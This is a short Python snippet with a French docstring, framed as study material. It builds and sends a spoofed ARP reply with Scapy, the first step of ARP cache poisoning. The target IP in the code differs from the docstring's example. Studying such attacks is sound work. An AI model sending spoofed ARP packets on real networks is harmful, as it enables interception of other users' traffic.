...
"""
Construire un paquet ARP "spoofé" et analyser les implications en
environnement local (à des fins d'étude uniquement). Exemple :

op=2    ARP reply   Paquet de réponse ARP (même s’il n’y a pas eu de requête)
pdst    192.168.1.1 Adresse IP de la victime à qui on ment (souvent la passerelle)
psrc    192.168.1.100   Adresse IP qu’on prétend posséder
hwsrc   MAC de l’attaquant (par défaut) Scapy met automatiquement l'adresse MAC de la machine
"""
def arp_spoof():
    arp_spoof = ARP(op=2, pdst="10.21.0.255", psrc="192.168.1.100",hwsrc="00:11:22:33:44:55")
    sr1(arp_spoof)
